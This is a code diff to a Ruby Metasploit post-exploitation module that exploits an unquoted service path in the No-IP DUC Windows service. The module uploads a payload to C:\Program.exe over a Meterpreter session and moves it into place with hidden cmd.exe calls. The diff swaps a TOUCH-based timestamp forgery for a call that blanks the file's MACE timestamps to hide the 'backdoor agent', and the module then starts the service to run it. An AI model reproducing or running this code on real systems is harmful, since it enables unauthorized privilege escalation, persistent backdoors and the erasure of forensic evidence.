@@ -185,8 +185,7 @@ def ls_stage1
   bin_shell = "Program.exe"                                  # service-binary name
   bin_path = "C:\\Program.exe"                               # remote deploy path
   local_path = datastore['LOCAL_PATH']                       # /root/Program.exe
-  service_path = "\"%programfiles%\"\\No-IP\\ducservice.exe" # binary_path_name
-  time_stamp = "\"TOUCH /t 2015 10 01 07 30 00\""            # 1-10-2015 7:30 am
+  service_path = "%programfiles%\\No-IP\\ducservice.exe" # binary_path_name
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['LOCAL_PATH'] == 'nil'
@@ -213,15 +212,23 @@ def ls_stage1
         sleep(1.0)
  
           # upload our executable into temp foldder
-          print_good(" execute => Uploading payload to: #{bin_path}")
+          print_good(" Uploading #{local_path} to: #{bin_path}")
           client.fs.file.upload("%temp%\\#{bin_shell}","#{local_path}")
           sleep(1.5)
  
     # move payload to the rigth directory (unquoted service path)
     r = session.sys.process.execute("cmd.exe /c move /y %temp%\\#{bin_shell} #{bin_path}", nil, {'Hidden' => true, 'Channelized' => true})
-    # Change payload timestamp (date:time) -> set date to 7:30 am 1st October 2015
-    print_good(" timestamp => #{time_stamp}")
-    r = session.sys.process.execute("cmd.exe /c #{time_stamp} #{bin_path}", nil, {'Hidden' => true, 'Channelized' => true})
+
+      # check if remote path exists?
+      if bin_path.nil?
+        print_error("ABORT: post-module cant find backdoor binary...")
+        print_error("Please check: #{bin_path}")
+        return
+      end
+
+    # Change payload timestamp (date:time)
+    print_good(" timestamp => Blank backdoor agent timestamp...")
+    client.priv.fs.blank_file_mace(bin_path)
     sleep(1.5)
     r = session.sys.process.execute("cmd.exe /c sc start NoIPDUCService4", nil, {'Hidden' => true, 'Channelized' => true})
 
